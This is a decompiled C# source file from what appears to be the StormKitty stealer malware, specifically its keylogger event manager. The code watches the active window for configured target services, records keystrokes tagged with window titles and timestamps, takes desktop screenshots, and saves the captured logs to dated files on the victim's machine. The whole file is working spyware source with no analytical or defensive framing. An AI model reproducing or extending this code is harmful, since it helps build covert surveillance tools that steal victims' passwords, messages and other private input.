﻿using System;
using System.IO;
using Stealer;
using StormKitty;

namespace Keylogger
{
	// Token: 0x0200004C RID: 76
	internal sealed class EventManager
	{
		// Token: 0x0600010C RID: 268 RVA: 0x00008910 File Offset: 0x00006B10
		public static void Action()
		{
			if (EventManager.Detect())
			{
				Keylogger.KeyLogs = string.Concat(new string[]
				{
					Keylogger.KeyLogs,
					"\n\n### ",
					WindowManager.ActiveWindow,
					" ### (",
					DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"),
					")\n"
				});
				DesktopScreenshot.Make(EventManager.KeyloggerDirectory);
				Keylogger.KeyloggerEnabled = true;
				return;
			}
			EventManager.SendKeyLogs();
			Keylogger.KeyloggerEnabled = false;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00008990 File Offset: 0x00006B90
		private static bool Detect()
		{
			foreach (string value in Config.KeyloggerServices)
			{
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600010E RID: 270 RVA: 0x000089CC File Offset: 0x00006BCC
		private static void SendKeyLogs()
		{
			if (Keylogger.KeyLogs.Length < 45 || string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
			{
				return;
			}
			string path = EventManager.KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
			if (!Directory.Exists(EventManager.KeyloggerDirectory))
			{
				Directory.CreateDirectory(EventManager.KeyloggerDirectory);
			}
			File.WriteAllText(path, Keylogger.KeyLogs);
			Keylogger.KeyLogs = "";
		}

		// Token: 0x040000B4 RID: 180
		private static string KeyloggerDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\keylogger\\" + DateTime.Now.ToString("yyyy-MM-dd"));
	}
}
